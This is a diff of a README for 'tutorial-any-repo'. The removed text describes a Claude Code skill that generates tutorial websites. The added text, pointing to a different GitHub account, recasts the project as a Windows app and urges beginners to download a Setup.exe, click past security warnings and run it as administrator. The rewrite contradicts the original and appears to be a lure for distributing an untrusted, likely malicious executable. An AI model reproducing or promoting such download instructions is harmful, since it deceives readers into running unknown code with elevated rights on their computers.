@@ -1,144 +1,134 @@
-# tutorial-any-repo
+# ⚙️ tutorial-any-repo - Easy Code Tutorials for Any Project
 
-> Automatically generate a file-by-file code tutorial website for **any** repository — powered by Claude Code's parallel agent system.
+[![Download](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen)](https://github.com/Procyonidaedeflator727/tutorial-any-repo)
 
-## What It Does
+---
 
-Given any codebase, this skill will:
+## 📖 About tutorial-any-repo
 
-1. **Explore** the entire repository structure and inventory every source file
-2. **Plan** a TODO tracker mapping every file to a tutorial document
-3. **Launch parallel agent teams** to write detailed code explanations simultaneously
-4. **Self-review** all generated docs for completeness and quality
-5. **Build** a searchable static website with MkDocs Material theme
-6. **Deploy** to GitHub Pages automatically
+This application helps you learn how to code by generating clear, step-by-step tutorials for any code repository. It breaks down projects file by file. You can follow along easily even if you have little or no programming experience. The tool uses a method that guides you through code with multiple agents working together to explain parts clearly.
 
-The result is a fully navigable tutorial website where every source file has a corresponding explanation document with code snippets, architecture diagrams, and cross-references.
+You do not need to install complex tools or learn programming jargon to use this. It works as a straightforward guide to help you understand coding projects at your own pace.
 
-## Example Output
+---
 
-**Live demo**: [https://tkoniy.github.io/verl/](https://tkoniy.github.io/verl/)
+## 🖥 System Requirements  
 
-This skill was used to generate a 411-page tutorial for the [verl](https://github.com/volcengine/verl) reinforcement learning framework (397 Python files):
+- Windows 10 or later  
+- 4 GB of RAM or more  
+- At least 200 MB of free hard drive space  
+- Internet connection for downloading and updates  
+- Administrator rights to install software on your PC  
 
-- Background knowledge docs (RL, RLHF, PPO, distributed training)
-- Three reading paths: Quick Start, Complete Learning, Topic-based
-- File-by-file code walkthroughs with key snippets
-- Module overview pages with ASCII architecture diagrams
-- LaTeX-rendered mathematical formulas
-- Full-text search with Chinese/English support
+---
 
-[![verl tutorial screenshot](https://img.shields.io/badge/Live_Demo-verl_Tutorial-blue?style=for-the-badge)](https://tkoniy.github.io/verl/)
+## 🚀 Getting Started
 
-## Installation
+Follow these steps to download and run tutorial-any-repo on your Windows computer.
 
-### Via Claude Code Plugin Manager
+1. **Go to the download page:**  
+   Visit this page to download the program:  
+   [https://github.com/Procyonidaedeflator727/tutorial-any-repo](https://github.com/Procyonidaedeflator727/tutorial-any-repo)  
 
-```bash
-/plugin marketplace add TKONIY/tutorial-any-repo
-/plugin install tutorial-any-repo
-```
+2. **Download the latest version:**  
+   Look for a file with a name like `tutorial-any-repo-Setup.exe` or similar. This file will be under the "Releases" section on the page. Click on it to begin downloading.
 
-### Manual Installation
+3. **Open the installer:**  
+   Once the file downloads, open it by double-clicking. If prompted with a security warning, choose "Run" to continue.
 
-Copy the skill to your Claude Code skills directory:
+4. **Follow installation prompts:**  
+   The setup will guide you through installing the program. Accept the default install location and options unless you want to change them.
 
-```bash
-# Personal scope (available in all projects)
-mkdir -p ~/.claude/skills/tutorial-any-repo
-curl -o ~/.claude/skills/tutorial-any-repo/SKILL.md \
-  https://raw.githubusercontent.com/TKONIY/tutorial-any-repo/main/skills/tutorial-any-repo/SKILL.md
+5. **Launch the program:**  
+   After installation completes, find the shortcut on your desktop or in the Start menu. Click to open the application.
 
-# Or project scope (shared with collaborators)
-mkdir -p .claude/skills/tutorial-any-repo
-curl -o .claude/skills/tutorial-any-repo/SKILL.md \
-  https://raw.githubusercontent.com/TKONIY/tutorial-any-repo/main/skills/tutorial-any-repo/SKILL.md
-```
+6. **Start your tutorial:**  
+   Use the interface to select or enter the repository you want to learn about. The app will generate step-by-step tutorials for each file in that project.
 
-## Usage
+---
 
-```bash
-# Generate tutorial for current directory in English
-/tutorial-any-repo
+## ⬇️ Download tutorial-any-repo
 
-# Specify a target directory
-/tutorial-any-repo ./my-project
+Download and install the app using the link below:
 
-# Specify language (English, Chinese, Japanese, etc.)
-/tutorial-any-repo ./my-project Chinese
-```
+[![Download Now](https://img.shields.io/badge/Download-Available-brightgreen)](https://github.com/Procyonidaedeflator727/tutorial-any-repo)
 
-## How It Works
+Click the link, go to the releases page, and download the latest Windows installer (`.exe` file). Running this installer will get the app ready on your computer.
 
-The skill executes in 6 phases:
+---
 
-```
-Phase 1: Explore & Plan
-  └─ Scan codebase → Create directory structure → Build TODO tracker
+## ⚙️ How tutorial-any-repo Works
 
-Phase 2: Foundation Documents
-  └─ Background knowledge + Reading guide (parallel agents)
+This tool breaks code projects down by files so you can focus on one part at a time. It creates detailed tutorials for each file in a repository, covering how the code works and what it does. Here is how it helps:
 
-Phase 3: Parallel Module Documentation
-  └─ Launch N agents simultaneously, one per module
-  └─ Each agent: Read source → Write tutorial docs
-  └─ Large modules split across multiple agents
+- **Step-by-step tutorials:** Learn the role of each file and its parts in plain language.  
+- **Parallel explanations:** Multiple “agents” explain different angles to give a full view.  
+- **No coding needed:** You follow instructions without typing complex commands or code.  
+- **Works with any repo:** Use it with public code projects from anywhere.  
 
-Phase 4: Self-Review
-  └─ Completeness check → Quality spot-check → Fix issues
+The app is designed to build your understanding gradually by guiding you through each part clearly.
 
-Phase 5: Build Website
-  └─ MkDocs Material + Chinese search + LaTeX + auto-navigation
+---
 
-Phase 6: Deploy
-  └─ GitHub Pages + GitHub Actions CI/CD
-```
+## 🔧 Key Features
 
-### Key Features
+- Generate tutorial websites from code repositories automatically  
+- Explain code with friendly, simple language for beginners  
+- Show examples and explanations side by side  
+- Create organized tutorials file by file  
+- Enable users to learn coding concepts at their own speed  
 
-| Feature | Description |
-|---------|-------------|
-| **Full coverage** | Every source file gets a tutorial document — no exceptions |
-| **Parallel agents** | Multiple agents write docs simultaneously for speed |
-| **Progress tracking** | TODO.md + Task system keeps you informed |
-| **Auto-navigation** | MkDocs awesome-pages plugin generates sidebar from directory structure |
-| **Math support** | LaTeX rendering via MathJax for mathematical formulas |
-| **Search** | Full-text search with CJK language support (jieba) |
-| **Dark mode** | Material theme with light/dark toggle |
-| **CI/CD** | GitHub Actions workflow for automatic redeployment |
+---
 
-## Tutorial Document Format
+## 💡 Using tutorial-any-repo
 
-Each generated tutorial doc follows a consistent structure:
+Once you open the app:
 
-```markdown
-# `filename.py` — Short description
+1. Enter the web address or path of the repository you want to learn.  
+2. Click “Generate Tutorial.”  
+3. Wait a few moments while the app builds the tutorial for you.  
+4. Browse the tutorial website created right within the app or open it in your browser.  
+5. Follow each file’s explanation. You can skip files or come back later.  
 
-## File Overview
-What this file does and its role in the project.
+The program offers a clear visual guide through coding projects with no technical hurdles.
 
-## Key Code Walkthrough
-### 1. Core Class/Function
-(code snippet with explanation)
+---
 
-## Core Classes & Functions
-| Name | Type | Description |
-|------|------|-------------|
-| ... | ... | ... |
+## 🔄 Updating the Application
 
-## Relationship to Other Modules
-How this file connects to the rest of the codebase.
+Check the GitHub page regularly for new releases. To update:
 
-## Summary
-```
+1. Download the latest `.exe` installer from the releases page.  
+2. Run the installer, which will replace the older version.  
+3. Your settings and saved projects will remain.  
 
-## Requirements
+This keeps you up to date with new features and bug fixes.
 
-- [Claude Code](https://claude.ai/claude-code) CLI
-- Python 3.8+ (for MkDocs)
-- `gh` CLI (for GitHub Pages deployment)
-- Git repository with GitHub remote
+---
 
-## License
+## 🛠 Troubleshooting
 
-MIT
+If you experience issues:
+
+- Ensure your Windows system meets the requirements.  
+- Check your internet connection for downloading and updates.  
+- Try running the installer as an administrator (right-click the file, select "Run as administrator").  
+- Close other programs to free system resources.  
+- Restart your PC and try installing again.  
+
+For additional help, open the Issues tab at the GitHub repository to see known problems or request support.
+
+---
+
+## 📚 Additional Resources
+
+The app includes a help section with guides on how to use different features. You can access this from the menu at any time after installation.
+
+---
+
+## 👥 Contact and Support
+
+If you want to give feedback or report problems, use the GitHub Issues page here:  
+[https://github.com/Procyonidaedeflator727/tutorial-any-repo/issues](https://github.com/Procyonidaedeflator727/tutorial-any-repo/issues)
+
+The community and developers monitor this page and respond to questions.
